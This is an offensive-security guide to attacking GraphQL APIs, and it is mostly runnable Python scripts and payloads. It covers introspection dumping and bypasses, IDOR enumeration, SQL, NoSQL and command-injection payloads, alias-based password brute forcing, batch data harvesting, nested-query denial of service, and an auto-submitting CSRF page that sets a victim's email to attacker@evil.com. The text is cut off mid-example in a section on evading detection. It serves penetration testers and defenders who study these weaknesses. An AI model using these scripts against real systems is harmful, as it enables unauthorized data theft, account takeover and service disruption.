## GraphQL API Vulnerabilities

- **What GraphQL is**
  - Data query and manipulation language for APIs developed by Facebook in 2015
  - Alternative to REST offering more efficient data retrieval with a single request
  - Uses a type system to define available data and operations
  - Consists of schemas, types, fields, queries, mutations, and subscriptions
  - Allows clients to request exactly what they need and nothing more
  - Strongly typed system with runtime validation capabilities
  - Single endpoint architecture unlike REST's multiple endpoints
  - Introspective by nature - allowing queries about the schema itself
  - Declarative data fetching where clients determine the structure
  - Stateless operations with normalized responses
  - Supports real-time data with subscriptions
  - Can be implemented in almost any programming language
  - Used by major companies like GitHub, Twitter, Shopify, and Airbnb

- **How vulnerabilities arise**
  - Improper implementation of authentication/authorization mechanisms
  - Exposing introspection in production environments
  - Inadequate rate limiting leading to DoS vulnerabilities
  - Missing or improper input validation for query arguments
  - Lack of proper sanitization for database operations
  - Overly permissive CORS configurations
  - Unprotected GraphQL endpoints accessible to unauthenticated users
  - Verbose error messages exposing sensitive information
  - Missing schema validation allowing complex or malicious queries
  - Inadequate protection against batching attacks
  - Improper handling of nested queries leading to N+1 issues
  - Exposed debug information in development endpoints
  - Lack of proper CSRF protections (accepting GET requests or non-JSON content types)
  - Flawed implementation of custom directives
  - Missing depth limiting for recursive queries

- **Impact**
  - Information disclosure through introspection
  - Data leakage through overfetching or improper authorization
  - Unauthorized access to sensitive data
  - Server resource exhaustion from complex queries
  - Authentication bypass
  - Access control bypass
  - Injection attacks (SQL, NoSQL, etc.)
  - Cross-site request forgery (CSRF)
  - Business logic abuse
  - Complete API enumeration
  - Mass data harvesting
  - Account takeover
  - Privilege escalation
  - Service unavailability through DoS
  - Database corruption or manipulation

- **Identifying GraphQL endpoints**
  - **Common endpoint locations**:
    - /graphql
    - /api/graphql
    - /graphql/api
    - /api
    - /query
    - /graphql/console
    - /graphiql
    - /graphql.php
    - /v1/graphql
    - /playground
    
  - **Detection techniques**:
    1. **Universal query testing**:
       - Send the query `{__typename}` to potential endpoints
       - Successful response contains `{"data":{"__typename":"Query"}}`
       - Try both GET and POST requests with content-type application/json
       - Example command:
       ```bash
       curl -s -X POST https://target.com/graphql -H "Content-Type: application/json" -d '{"query":"{__typename}"}'
       ```
       
    2. **Fingerprinting through errors**:
       - Send malformed GraphQL queries to provoke error responses
       - Look for GraphQL-specific error messages
       - Test query with syntax error: `{__schema{`
       - Example command:
       ```bash
       curl -s -X POST https://target.com/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{"}'
       ```
       
    3. **Technology stack analysis**:
       - Examine HTTP response headers for GraphQL-related information
       - Check for JavaScript files that might reference GraphQL endpoints
       - Look for GraphQL client libraries in the source code (Apollo, Relay, etc.)
       - Example command:
       ```bash
       curl -s -I https://target.com | grep -i "apollo\|graphql"
       ```
       
    4. **Multiple request methods testing**:
       - Test both GET and POST methods
       - Try different content types:
         - application/json
         - application/graphql
         - application/x-www-form-urlencoded
       - Example commands:
       ```bash
       # POST with JSON
       curl -s -X POST https://target.com/graphql -H "Content-Type: application/json" -d '{"query":"{__typename}"}'
       
       # GET request
       curl -s "https://target.com/graphql?query={__typename}"
       
       # POST with form data
       curl -s -X POST https://target.com/graphql -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "query={__typename}"
       ```

- **Using Burp Suite for GraphQL testing**
  - **GraphQL-specific extensions**:
    - InQL Scanner: Automatic schema detection and query generation
    - GraphQL Raider: Advanced GraphQL testing capabilities
    - JSON Query Extractor: Extract JSON queries from requests
  
  - **Setting up Burp for GraphQL testing**:
    1. Install necessary extensions
    2. Configure target scope to include potential GraphQL endpoints
    3. Set up session handling rules if authentication is required
    4. Configure the scanner to detect GraphQL-specific issues
  
  - **Using InQL Scanner**:
    1. Load a GraphQL endpoint in InQL
    2. Extract schema information through introspection
    3. Generate template queries for all available operations
    4. Test queries directly from the InQL interface
  
  - **Manual testing with Repeater**:
    1. Capture GraphQL requests in the Proxy
    2. Send interesting requests to Repeater
    3. Modify queries to test for vulnerabilities
    4. Analyze responses for sensitive data or errors

- **Step-by-step exploitation techniques**

  - **Exploiting introspection**
    1. **Basic introspection detection**:
       - Step 1: Send a simple introspection query to check if enabled
       ```graphql
       {
         __schema {
           queryType {
             name
           }
         }
       }
       ```
       - Step 2: If successful, the response will contain schema information
       - Step 3: Expand query to obtain more detailed schema information
       - Step 4: Use the schema to identify sensitive operations or fields
       - Step 5: Document all discovered types, queries, and mutations
       - Python script for basic introspection testing:
       ```python
       import requests
       import json
       
       def test_introspection(url):
           headers = {"Content-Type": "application/json"}
           query = {"query": "{__schema{queryType{name}}}"}
           
           response = requests.post(url, headers=headers, json=query)
           
           if response.status_code == 200:
               try:
                   result = response.json()
                   if "data" in result and "__schema" in result["data"]:
                       print("[+] Introspection is enabled!")
                       print(json.dumps(result, indent=2))
                       return True
                   else:
                       print("[-] Response doesn't contain schema data")
               except:
                   print("[-] Response is not valid JSON")
           else:
               print(f"[-] Request failed with status code {response.status_code}")
           
           return False
       
       # Example usage
       test_introspection("https://target.com/graphql")
       ```
    
    2. **Comprehensive schema extraction**:
       - Step 1: Use a full introspection query to extract complete schema
       ```graphql
       query IntrospectionQuery {
         __schema {
           queryType { name }
           mutationType { name }
           subscriptionType { name }
           types {
             ...FullType
           }
           directives {
             name
             description
             locations
             args {
               ...InputValue
             }
           }
         }
       }
       
       fragment FullType on __Type {
         kind
         name
         description
         fields(includeDeprecated: true) {
           name
           description
           args {
             ...InputValue
           }
           type {
             ...TypeRef
           }
           isDeprecated
           deprecationReason
         }
         inputFields {
           ...InputValue
         }
         interfaces {
           ...TypeRef
         }
         enumValues(includeDeprecated: true) {
           name
           description
           isDeprecated
           deprecationReason
         }
         possibleTypes {
           ...TypeRef
         }
       }
       
       fragment InputValue on __InputValue {
         name
         description
         type { ...TypeRef }
         defaultValue
       }
       
       fragment TypeRef on __Type {
         kind
         name
         ofType {
           kind
           name
           ofType {
             kind
             name
             ofType {
               kind
               name
               ofType {
                 kind
                 name
                 ofType {
                   kind
                   name
                   ofType {
                     kind
                     name
                     ofType {
                       kind
                       name
                     }
                   }
                 }
               }
             }
           }
         }
       }
       ```
       - Step 2: Save the schema in a structured format for analysis
       - Step 3: Identify sensitive operations, fields, and data types
       - Step 4: Look for authorization-related fields (isAdmin, hasPermission, etc.)
       - Step 5: Map out the relationships between different types
       - Python script for full schema extraction:
       ```python
       import requests
       import json
       
       def extract_full_schema(url):
           with open('introspection_query.graphql', 'r') as f:
               introspection_query = f.read()
           
           headers = {"Content-Type": "application/json"}
           query = {"query": introspection_query}
           
           response = requests.post(url, headers=headers, json=query)
           
           if response.status_code == 200:
               try:
                   result = response.json()
                   if "data" in result and "__schema" in result["data"]:
                       with open('schema.json', 'w') as f:
                           json.dump(result, f, indent=2)
                       print("[+] Full schema extracted and saved to schema.json")
                       
                       # Extract and print all query fields
                       query_type = None
                       types = result["data"]["__schema"]["types"]
                       
                       for t in types:
                           if t["name"] == result["data"]["__schema"]["queryType"]["name"]:
                               query_type = t
                               break
                       
                       if query_type and "fields" in query_type:
                           print("\n[+] Available Queries:")
                           for field in query_type["fields"]:
                               print(f"  - {field['name']}")
                       
                       return True
                   else:
                       print("[-] Response doesn't contain schema data")
               except Exception as e:
                   print(f"[-] Error processing response: {str(e)}")
           else:
               print(f"[-] Request failed with status code {response.status_code}")
           
           return False
       
       # Example usage
       extract_full_schema("https://target.com/graphql")
       ```
    
    3. **Bypassing introspection protections**:
       - Step 1: Try alternative formats of the introspection query
       - Step 2: Insert newlines or spaces in the `__schema` keyword
       ```graphql
       {
         __schema
         {
           types {
             name
           }
         }
       }
       ```
       - Step 3: Try using GET requests instead of POST
       - Step 4: Test different content types (application/graphql)
       - Step 5: Try batched queries with both valid and introspection queries
       - Example CURL command with newline bypass:
       ```bash
       curl -s -X POST https://target.com/graphql -H "Content-Type: application/json" -d '{"query":"{\n__schema\n{queryType{name}}}"}'
       ```
    
    4. **Using suggestions for schema discovery**:
       - Step 1: Send queries with slightly incorrect field names
       - Step 2: Analyze error messages for suggestions
       - Step 3: Use these suggestions to map the schema incrementally
       - Step 4: Automate the process to discover all fields
       - Step 5: Compile discovered fields into a schema
       - Example query to trigger suggestions:
       ```graphql
       {
         userr {
           id
         }
       }
       ```
       - Response might include: `"Did you mean user?"`
       - Python script using Clairvoyance for schema discovery:
       ```python
       import requests
       import re
       
       def discover_fields_via_suggestions(url):
           headers = {"Content-Type": "application/json"}
           discovered_fields = []
           
           # List of common fields to try
           test_fields = ["user", "users", "account", "profile", "admin", "settings", "product", "order", "transaction"]
           
           for field in test_fields:
               # Try with a typo
               query = {"query": "{" + field + "r { id }}"}
               response = requests.post(url, headers=headers, json=query)
               
               if response.status_code == 200:
                   try:
                       result = response.json()
                       if "errors" in result:
                           for error in result["errors"]:
                               # Look for "Did you mean" suggestions
                               suggestion_match = re.search(r"Did you mean \"?([a-zA-Z0-9_]+)\"?", error.get("message", ""))
                               if suggestion_match:
                                   suggested_field = suggestion_match.group(1)
                                   if suggested_field not in discovered_fields:
                                       discovered_fields.append(suggested_field)
                                       print(f"[+] Discovered field: {suggested_field}")
                   except:
                       pass
           
           return discovered_fields
       
       # Example usage
       discover_fields_via_suggestions("https://target.com/graphql")
       ```

  - **Exploiting unsanitized arguments**
    1. **Identifying IDOR vulnerabilities**:
       - Step 1: Find queries that accept object identifiers
       - Step 2: Test accessing other users' data by changing IDs
       - Step 3: Try sequential IDs, UUIDs, or encoded identifiers
       - Step 4: Check for authorization verification
       - Step 5: Document accessible resources
       - Example query with IDOR:
       ```graphql
       # Original query
       {
         user(id: "current_user_id") {
           email
           profile {
             fullName
             address
           }
         }
       }
       
       # IDOR exploitation
       {
         user(id: "another_user_id") {
           email
           profile {
             fullName
             address
           }
         }
       }
       ```
       - Python script for IDOR testing:
       ```python
       import requests
       import json
       
       def test_idor(url, query_template, id_list):
           headers = {"Content-Type": "application/json"}
           results = {}
           
           for test_id in id_list:
               query = query_template.replace("{{ID}}", test_id)
               response = requests.post(url, headers=headers, json={"query": query})
               
               if response.status_code == 200:
                   data = response.json()
                   if "data" in data and not all(v is None for v in data["data"].values()):
                       print(f"[+] ID {test_id} accessible:")
                       print(json.dumps(data["data"], indent=2))
                       results[test_id] = data["data"]
           
           return results
       
       # Example usage
       query_template = """
       {
         user(id: "{{ID}}") {
           email
           profile {
             fullName
           }
         }
       }
       """
       
       # Test sequential IDs
       id_list = [str(i) for i in range(1, 10)]
       test_idor("https://target.com/graphql", query_template, id_list)
       ```
    
    2. **SQL injection via arguments**:
       - Step 1: Identify queries that might pass arguments to a database
       - Step 2: Test basic SQL injection payloads in string arguments
       - Step 3: Look for error messages or data changes
       - Step 4: Refine payloads based on the database type
       - Step 5: Extract sensitive data or perform other SQL injection attacks
       - Example SQL injection in GraphQL:
       ```graphql
       {
         user(id: "1' OR 1=1--") {
           id
           username
           email
         }
       }
       ```
       - Python script for SQL injection testing:
       ```python
       import requests
       
       def test_sql_injection(url, field_name):
           headers = {"Content-Type": "application/json"}
           payloads = [
               "1' OR '1'='1",
               "1' OR '1'='1'--",
               "1\" OR \"1\"=\"1",
               "1\" OR \"1\"=\"1\"--",
               "1 OR 1=1",
               "1' UNION SELECT 1,2,3--",
               "1' UNION SELECT NULL,NULL,NULL--",
           ]
           
           for payload in payloads:
               query = f"""{{
                 user(id: "{payload}") {{
                   id
                   username
                   email
                 }}
               }}"""
               
               response = requests.post(url, headers=headers, json={"query": query})
               
               print(f"[*] Testing payload: {payload}")
               print(f"[*] Status code: {response.status_code}")
               
               if response.status_code == 200:
                   result = response.json()
                   # Look for signs of successful injection
                   if "data" in result and result["data"] and result["data"].get("user"):
                       if isinstance(result["data"]["user"], list) and len(result["data"]["user"]) > 1:
                           print("[+] Possible SQL injection - multiple records returned")
                           print(result["data"]["user"])
                       elif result["data"]["user"]:
                           print("[*] Single record returned:")
                           print(result["data"]["user"])
                   
                   # Check for error messages that might reveal SQL syntax
                   if "errors" in result:
                       for error in result["errors"]:
                           if "SQL" in error.get("message", "") or "syntax" in error.get("message", "").lower():
                               print("[+] SQL-related error detected:")
                               print(error["message"])
               
               print("-" * 50)
       
       # Example usage
       test_sql_injection("https://target.com/graphql", "user")
       ```
    
    3. **NoSQL injection via arguments**:
       - Step 1: Identify GraphQL APIs that might use NoSQL databases
       - Step 2: Test NoSQL-specific operators and syntax
       - Step 3: Look for error messages or data anomalies
       - Step 4: Refine payloads based on the database type (MongoDB, etc.)
       - Step 5: Extract data or manipulate queries
       - Example NoSQL injection in GraphQL:
       ```graphql
       {
         user(id: "1", username: {"$ne": null}) {
           id
           username
           email
         }
       }
       ```
       - Python script for NoSQL injection:
       ```python
       import requests
       import json
       
       def test_nosql_injection(url):
           headers = {"Content-Type": "application/json"}
           
           # MongoDB-style NoSQL injection payloads
           payloads = [
               {"query": """{ user(username: {$ne: null}) { id username email } }"""},
               {"query": """{ user(username: {$in: ["admin", "administrator"]}) { id username email } }"""},
               {"query": """{ user(username: "admin", password: {$regex: "^a"}) { id username email } }"""},
           ]
           
           for i, payload in enumerate(payloads):
               print(f"[*] Testing payload {i+1}: {payload}")
               
               response = requests.post(url, headers=headers, json=payload)
               
               if response.status_code == 200:
                   try:
                       result = response.json()
                       print(f"[*] Response: {json.dumps(result, indent=2)}")
                       
                       # Check for signs of successful injection
                       if "data" in result and result["data"] and result["data"].get("user"):
                           if isinstance(result["data"]["user"], list) and len(result["data"]["user"]) > 0:
                               print("[+] Possible NoSQL injection - records returned")
                           elif result["data"]["user"]:
                               print("[+] Single record returned - possible injection")
                   except:
                       print("[-] Failed to parse JSON response")
               else:
                   print(f"[-] Request failed with status code {response.status_code}")
               
               print("-" * 50)
       
       # Example usage
       test_nosql_injection("https://target.com/graphql")
       ```
    
    4. **Command injection via arguments**:
       - Step 1: Identify arguments that might be passed to system commands
       - Step 2: Test basic command injection payloads
       - Step 3: Look for timing delays or command output in responses
       - Step 4: Use out-of-band techniques to confirm blind injections
       - Step 5: Escalate to achieve code execution
       - Example command injection in GraphQL:
       ```graphql
       mutation {
         generateReport(format: "pdf", filename: "report`sleep 10`") {
           downloadUrl
         }
       }
       ```
       - Python script for command injection testing:
       ```python
       import requests
       import time
       
       def test_command_injection(url):
           headers = {"Content-Type": "application/json"}
           
           # Test payloads with timing attacks
           test_cases = [
               {
                   "name": "Basic Sleep Command",
                   "query": """
                   mutation {
                     generateReport(format: "pdf", filename: "report`sleep 5`") {
                       downloadUrl
                     }
                   }
                   """
               },
               {
                   "name": "Piped Command",
                   "query": """
                   mutation {
                     generateReport(format: "pdf", filename: "report | sleep 5") {
                       downloadUrl
                     }
                   }
                   """
               },
               {
                   "name": "Background Process",
                   "query": """
                   mutation {
                     generateReport(format: "pdf", filename: "report& sleep 5 &") {
                       downloadUrl
                     }
                   }
                   """
               }
           ]
           
           for test in test_cases:
               print(f"[*] Testing: {test['name']}")
               
               start_time = time.time()
               response = requests.post(url, headers=headers, json={"query": test["query"]})
               end_time = time.time()
               
               execution_time = end_time - start_time
               print(f"[*] Execution time: {execution_time:.2f} seconds")
               
               if execution_time >= 5:
                   print("[+] Potential command injection vulnerability detected!")
                   print(f"[+] Command execution took {execution_time:.2f} seconds")
               
               print(f"[*] Status code: {response.status_code}")
               if response.status_code == 200:
                   try:
                       result = response.json()
                       print(f"[*] Response: {result}")
                   except:
                       print("[-] Failed to parse JSON response")
               
               print("-" * 50)
       
       # Example usage
       test_command_injection("https://target.com/graphql")
       ```

  - **Bypassing rate limiting and DoS**
    1. **Exploiting batched queries**:
       - Step 1: Identify if the API supports batched queries
       - Step 2: Create an array of identical queries with different parameters
       - Step 3: Test if rate limiting is applied per HTTP request or per operation
       - Step 4: If per request, use batching to bypass limits
       - Step 5: Automate for large-scale data extraction
       - Example batched query:
       ```graphql
       [
         {"query": "{ user(id: \"1\") { username email } }"},
         {"query": "{ user(id: \"2\") { username email } }"},
         {"query": "{ user(id: \"3\") { username email } }"}
       ]
       ```
       - Python script for batched query exploitation:
       ```python
       import requests
       import json
       
       def exploit_batch_queries(url, query_template, id_range):
           headers = {"Content-Type": "application/json"}
           
           # Create batch of queries
           batch_queries = []
           for i in id_range:
               batch_queries.append({
                   "query": query_template.replace("{{ID}}", str(i))
               })
           
           print(f"[*] Sending batched request with {len(batch_queries)} queries")
           response = requests.post(url, headers=headers, json=batch_queries)
           
           if response.status_code == 200:
               try:
                   results = response.json()
                   print(f"[+] Batch query successful - received {len(results)} results")
                   
                   # Process and extract valuable data
                   extracted_data = []
                   for i, result in enumerate(results):
                       if "data" in result and result["data"] is not None:
                           user_id = id_range[i]
                           user_data = result["data"].get("user")
                           if user_data:
                               extracted_data.append({
                                   "id": user_id,
                                   "data": user_data
                               })
                   
                   print(f"[+] Successfully extracted data for {len(extracted_data)} users")
                   return extracted_data
               except Exception as e:
                   print(f"[-] Error processing response: {str(e)}")
           else:
               print(f"[-] Request failed with status code {response.status_code}")
           
           return None
       
       # Example usage
       query_template = """
       {
         user(id: "{{ID}}") {
           username
           email
           isAdmin
         }
       }
       """
       
       # Test with IDs from 1 to 100
       exploit_batch_queries("https://target.com/graphql", query_template, range(1, 101))
       ```
    
    2. **Using aliases for brute force attacks**:
       - Step 1: Create a single query with multiple aliased operations
       - Step 2: Each aliased operation tests a different value (password, etc.)
       - Step 3: Send as a single HTTP request to bypass request-based rate limiting
       - Step 4: Analyze the response to identify successful operations
       - Step 5: Automate to test large numbers of values
       - Example aliased query for brute forcing:
       ```graphql
       {
         try1: login(username: "admin", password: "password1") {
           success
           token
         }
         try2: login(username: "admin", password: "password2") {
           success
           token
         }
         try3: login(username: "admin", password: "password3") {
           success
           token
         }
       }
       ```
       - Python script for alias brute forcing:
       ```python
       import requests
       
       def brute_force_with_aliases(url, username, password_list):
           headers = {"Content-Type": "application/json"}
           
           # Construct query with aliases
           query_parts = []
           for i, password in enumerate(password_list):
               alias = f"try{i+1}"
               query_parts.append(f"""
                 {alias}: login(username: "{username}", password: "{password}") {{
                   success
                   token
                 }}
               """)
           
           full_query = "{\n" + "\n".join(query_parts) + "\n}"
           
           print(f"[*] Sending query with {len(password_list)} password attempts")
           response = requests.post(url, headers=headers, json={"query": full_query})
           
           if response.status_code == 200:
               try:
                   result = response.json()
                   if "data" in result:
                       # Check each aliased result for success
                       for i, password in enumerate(password_list):
                           alias = f"try{i+1}"
                           if alias in result["data"]:
                               login_attempt = result["data"][alias]
                               if login_attempt and login_attempt.get("success") == True:
                                   print(f"[+] Found working password: {password}")
                                   print(f"[+] Token: {login_attempt.get('token')}")
                                   return password, login_attempt.get('token')
                   
                   print("[-] No successful login attempts found")
               except Exception as e:
                   print(f"[-] Error processing response: {str(e)}")
           else:
               print(f"[-] Request failed with status code {response.status_code}")
           
           return None, None
       
       # Example usage
       password_list = ["password1", "123456", "admin", "qwerty", "letmein"]
       brute_force_with_aliases("https://target.com/graphql", "admin", password_list)
       ```
    
    3. **Nested query DoS attacks**:
       - Step 1: Identify fields that can be nested or recursively queried
       - Step 2: Create a deeply nested query that requires significant processing
       - Step 3: Test the impact on server resources
       - Step 4: Gradually increase complexity to find the threshold
       - Step 5: Determine if DoS is possible
       - Example nested query for DoS:
       ```graphql
       {
         users(first: 100) {
           edges {
             node {
               followers(first: 100) {
                 edges {
                   node {
                     followers(first: 100) {
                       edges {
                         node {
                           followers(first: 100) {
                             edges {
                               node {
                                 id
                                 name
                                 email
                               }
                             }
                           }
                         }
                       }
                     }
                   }
                 }
               }
             }
           }
         }
       }
       ```
       - Python script for nested query testing:
       ```python
       import requests
       import time
       
       def test_nested_query_dos(url, max_depth=5):
           headers = {"Content-Type": "application/json"}
           
           for depth in range(1, max_depth + 1):
               # Create nested query of specified depth
               inner_query = "{ id name email }"
               query = inner_query
               
               for i in range(depth):
                   query = f"""
                   followers(first: 100) {{
                     edges {{
                       node {{
                         {query}
                       }}
                     }}
                   }}
                   """
               
               full_query = f"""
               {{
                 users(first: 100) {{
                   edges {{
                     node {{
                       {query}
                     }}
                   }}
                 }}
               }}
               """
               
               print(f"[*] Testing query with nesting depth {depth}")
               start_time = time.time()
               
               response = requests.post(url, headers=headers, json={"query": full_query})
               
               end_time = time.time()
               execution_time = end_time - start_time
               
               print(f"[*] Execution time: {execution_time:.2f} seconds")
               print(f"[*] Status code: {response.status_code}")
               
               if response.status_code != 200 or execution_time > 10:
                   print(f"[+] Potential DoS vulnerability at depth {depth}")
                   print(f"[+] Execution time: {execution_time:.2f} seconds")
                   break
               
               print("-" * 50)
       
       # Example usage
       test_nested_query_dos("https://target.com/graphql")
       ```

  - **CSRF and authentication issues**
    1. **GraphQL CSRF exploitation**:
       - Step 1: Identify if the GraphQL endpoint accepts non-JSON content types
       - Step 2: Test if it accepts GET requests or form-encoded POST requests
       - Step 3: Check if CSRF tokens are required for mutations
       - Step 4: Craft a CSRF proof of concept exploit
       - Step 5: Test the exploit to verify vulnerability
       - Example CSRF form for GraphQL:
       ```html
       <html>
         <body>
           <form action="https://target.com/graphql" method="POST" enctype="application/x-www-form-urlencoded">
             <input type="hidden" name="query" value="mutation { updateEmail(email: &quot;attacker@evil.com&quot;) { success } }">
             <input type="submit" value="Click me to win a prize!">
           </form>
           <script>document.forms[0].submit();</script>
         </body>
       </html>
       ```
       - Python script to test for CSRF vulnerability:
       ```python
       import requests
       
       def test_graphql_csrf(url):
           print("[*] Testing for GraphQL CSRF vulnerability")
           
           # Test 1: GET request with query parameter
           print("[*] Test 1: GET request with query parameter")
           get_query = "mutation{updateEmail(email:\"test@example.com\"){success}}"
           get_url = f"{url}?query={get_query}"
           
           response = requests.get(get_url)
           print(f"[*] Status code: {response.status_code}")
           if response.status_code == 200:
               print("[+] GET requests accepted - potential CSRF vulnerability")
           
           # Test 2: POST request with form encoding
           print("\n[*] Test 2: POST request with form encoding")
           headers = {"Content-Type": "application/x-www-form-urlencoded"}
           data = {"query": "mutation{updateEmail(email:\"test@example.com\"){success}}"}
           
           response = requests.post(url, headers=headers, data=data)
           print(f"[*] Status code: {response.status_code}")
           if response.status_code == 200:
               print("[+] Form-encoded POST requests accepted - potential CSRF vulnerability")
           
           # Test 3: POST without content type
           print("\n[*] Test 3: POST without Content-Type header")
           response = requests.post(url, data={"query": "mutation{updateEmail(email:\"test@example.com\"){success}}"})
           print(f"[*] Status code: {response.status_code}")
           if response.status_code == 200:
               print("[+] POST without Content-Type accepted - potential CSRF vulnerability")
           
           # Generate PoC if vulnerable
           if response.status_code == 200:
               print("\n[+] Creating CSRF PoC HTML:")
               poc_html = f"""
               <html>
                 <body>
                   <form action="{url}" method="POST" enctype="application/x-www-form-urlencoded">
                     <input type="hidden" name="query" value="mutation {{ updateEmail(email: &quot;attacker@evil.com&quot;) {{ success }} }}">
                     <input type="submit" value="Click me to win a prize!">
                   </form>
                   <script>document.forms[0].submit();</script>
                 </body>
               </html>
               """
               print(poc_html)
       
       # Example usage
       test_graphql_csrf("https://target.com/graphql")
       ```
    
    2. **Authentication bypass techniques**:
       - Step 1: Analyze the authentication mechanism used by the GraphQL API
       - Step 2: Test for unauthenticated access to sensitive queries and mutations
       - Step 3: Check for JWT vulnerabilities if JWTs are used
       - Step 4: Try parameter pollution with authentication headers
       - Step 5: Test for logic flaws in the authentication process
       - Example authentication bypass test:
       ```graphql
       # Test unauthenticated access to admin mutations
       mutation {
         deleteUser(id: "123") {
           success
         }
       }
       
       # Test for logic flaws in authentication
       mutation {
         login(username: "admin", password: "") {
           token
         }
       }
       ```
       - Python script for authentication testing:
       ```python
       import requests
       
       def test_auth_bypass(url):
           headers = {"Content-Type": "application/json"}
           
           # List of sensitive queries to test
           sensitive_queries = [
               # Admin operations
               {"name": "List all users", "query": "{ users { id username email isAdmin } }"},
               {"name": "Get admin user", "query": "{ user(role: \"admin\") { id username email } }"},
               {"name": "Delete user", "query": "mutation { deleteUser(id: \"2\") { success } }"},
               
               # Authentication tests
               {"name": "Empty password", "query": "mutation { login(username: \"admin\", password: \"\") { token success } }"},
               {"name": "SQL wildcard password", "query": "mutation { login(username: \"admin\", password: \"%\") { token success } }"},
               
               # Logic flaws
               {"name": "Register admin", "query": "mutation { register(username: \"hacker\", password: \"password\", role: \"admin\") { success user { username role } } }"}
           ]
           
           for test in sensitive_queries:
               print(f"[*] Testing: {test['name']}")
               response = requests.post(url, headers=headers, json={"query": test["query"]})
               
               print(f"[*] Status code: {response.status_code}")
               if response.status_code == 200:
                   result = response.json()
                   if "errors" not in result or not result["errors"]:
                       print("[+] No errors - potential vulnerability!")
                       print(f"[+] Response: {result}")
                   elif "data" in result and result["data"] and not all(v is None for v in result["data"].values()):
                       print("[+] Partial data returned - potential vulnerability!")
                       print(f"[+] Response: {result}")
               
               print("-" * 50)
       
       # Example usage
       test_auth_bypass("https://target.com/graphql")
       ```

- **Advanced exploitation techniques**
  1. **Information disclosure through error messages**:
     - Look for verbose error messages that reveal implementation details
     - Gradually craft malformed queries to trigger different errors
     - Analyze error messages for file paths, database information, or stack traces
     - Map internal architecture based on error information
     - Example Python script for error harvesting:
     ```python
     import requests
     import json
     
     def harvest_error_messages(url):
         headers = {"Content-Type": "application/json"}
         
         # List of queries designed to trigger different errors
         error_triggers = [
             {"name": "Syntax Error", "query": "{ user(id: 1 {}"},
             {"name": "Invalid Field", "query": "{ nonexistentField }"},
             {"name": "Type Mismatch", "query": "{ user(id: \"string_instead_of_int\") { id } }"},
             {"name": "Null Value", "query": "{ user(id: null) { id } }"},
             {"name": "Missing Required Arg", "query": "{ user { id } }"},
             {"name": "Invalid Enum", "query": "{ user(role: \"INVALID_ROLE\") { id } }"},
             {"name": "Invalid Operation", "query": "mutation { user { id } }"},
             {"name": "Nested Invalid Field", "query": "{ user(id: 1) { nonexistentField } }"},
         ]
         
         error_collection = {}
         
         for test in error_triggers:
             print(f"[*] Testing: {test['name']}")
             response = requests.post(url, headers=headers, json={"query": test["query"]})
             
             if response.status_code == 200 or response.status_code == 400:
                 try:
                     result = response.json()
                     if "errors" in result:
                         print(f"[+] Error messages found: {len(result['errors'])}")
                         error_collection[test["name"]] = result["errors"]
                         for error in result["errors"]:
                             # Look for sensitive information
                             sensitive_patterns = ["path", "line", "stack", "code", "sql", "database", 
                                                  "file", "internal", "server", "version"]
                             
                             error_msg = json.dumps(error)
                             for pattern in sensitive_patterns:
                                 if pattern in error_msg.lower():
                                     print(f"[+] Sensitive information found ({pattern}): {error.get('message', '')}")
                 except:
                     print("[-] Failed to parse JSON response")
             
             print("-" * 50)
         
         # Save all collected errors to a file
         with open('graphql_errors.json', 'w') as f:
             json.dump(error_collection, f, indent=2)
         
         return error_collection
     
     # Example usage
     harvest_error_messages("https://target.com/graphql")
     ```

  2. **Exploiting GraphQL directives**:
     - Identify custom directives used by the application
     - Test for insecure implementation of standard directives
     - Try using directives in unauthorized contexts
     - Look for ways to bypass access controls with directives
     - Example query testing directive exploitation:
     ```graphql
     {
       # Test @include directive
       user(id: 1) {
         id
         username
         # Try to include admin fields conditionally
         adminAccess @include(if: true) {
           permissions
         }
         # Try to avoid rate limiting
         creditCardNumber @skip(if: false)
       }
     }
     ```

  3. **Combining multiple vulnerabilities**:
     - Map all identified vulnerabilities
     - Look for ways to chain vulnerabilities together
     - Use information disclosure to improve injection attacks
     - Combine CSRF with privilege escalation
     - Chain multiple queries to maximize impact
     - Example of chained exploitation:
     ```python
     import requests
     
     def chain_vulnerabilities(url):
         headers = {"Content-Type": "application/json"}
         
         # Step 1: Use error disclosure to find field names
         print("[*] Step 1: Harvesting error messages to discover fields")
         query = {"query": "{ nonexistentField }"}
         response = requests.post(url, headers=headers, json=query)
         field_names = []
         
         if response.status_code == 200 or response.status_code == 400:
             result = response.json()
             if "errors" in result:
                 for error in result["errors"]:
                     message = error.get("message", "")
                     if "did you mean" in message.lower():
                         # Extract suggested field
                         import re
                         suggested = re.search(r'Did you mean "([^"]+)"', message)
                         if suggested:
                             field_name = suggested.group(1)
                             field_names.append(field_name)
                             print(f"[+] Discovered field: {field_name}")
         
         if not field_names:
             print("[-] No fields discovered, cannot continue chain")
             return
         
         # Step 2: Use batched queries to test discovered fields
         print(f"\n[*] Step 2: Testing discovered fields ({len(field_names)})")
         query_parts = []
         
         for i, field in enumerate(field_names):
             alias = f"field{i}"
             query_parts.append(f"{alias}: {field} {{ __typename }}")
         
         full_query = "{\n" + "\n".join(query_parts) + "\n}"
         response = requests.post(url, headers=headers, json={"query": full_query})
         
         accessible_fields = []
         if response.status_code == 200:
             result = response.json()
             if "data" in result:
                 for i, field in enumerate(field_names):
                     alias = f"field{i}"
                     if alias in result["data"] and result["data"][alias]:
                         accessible_fields.append(field)
                         print(f"[+] Accessible field: {field}")
         
         if not accessible_fields:
             print("[-] No accessible fields found, cannot continue chain")
             return
         
         # Step 3: Look for sensitive operations in accessible fields
         print(f"\n[*] Step 3: Testing for sensitive operations in {len(accessible_fields)} fields")
         for field in accessible_fields:
             # Try to access common sensitive subfields
             sensitive_subfields = ["id", "username", "email", "password", "token", "isAdmin", "role"]
             query = f"{{ {field} {{ {' '.join(sensitive_subfields)} }} }}"
             
             response = requests.post(url, headers=headers, json={"query": query})
             if response.status_code == 200:
                 result = response.json()
                 if "data" in result and result["data"][field]:
                     print(f"[+] Found sensitive data in {field}:")
                     print(result["data"][field])
         
         # Final step: If we found admin users or sensitive data, try to exploit
         print("\n[*] Step 4: Final exploitation based on findings")
         # (Specific exploitation would depend on what was found in previous steps)
     
     # Example usage
     chain_vulnerabilities("https://target.com/graphql")
     ```

- **Detection evasion techniques**
  1. **Evading introspection protections**:
     - Use alternative spacing and formatting for introspection queries
     - Add newlines between key terms: `__schema` → `__\nschema`
     - Try URL-encoded versions of introspection queries
     - Use fragments to split introspection queries
     - Switch between different request methods and content types
     - Example for adding newlines to bypass regex checks:
     ```graphql
     {
       __
